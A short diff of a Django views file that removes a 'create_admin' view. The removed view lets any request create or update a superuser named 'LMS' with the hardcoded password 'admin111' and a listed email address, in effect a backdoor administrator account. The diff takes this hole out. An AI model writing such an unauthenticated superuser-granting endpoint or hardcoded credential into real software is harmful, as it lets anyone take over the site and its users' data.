@@ -207,16 +207,3 @@ class CustomLoginView(LoginView):
         if user.is_staff or user.is_superuser:
             return '/'  
         return '/dashboard/'
-
-def create_admin(request):
-    User = get_user_model()
-    user, created = User.objects.get_or_create(username='LMS', defaults={
-        'email': 'snapzyyofficial@gmail.com',
-    })
-    user.set_password('admin111')
-    user.is_staff = True
-    user.is_superuser = True
-    user.save()
-    if created:
-        return HttpResponse("Superuser created!")
-    return HttpResponse("Superuser updated with admin rights!")
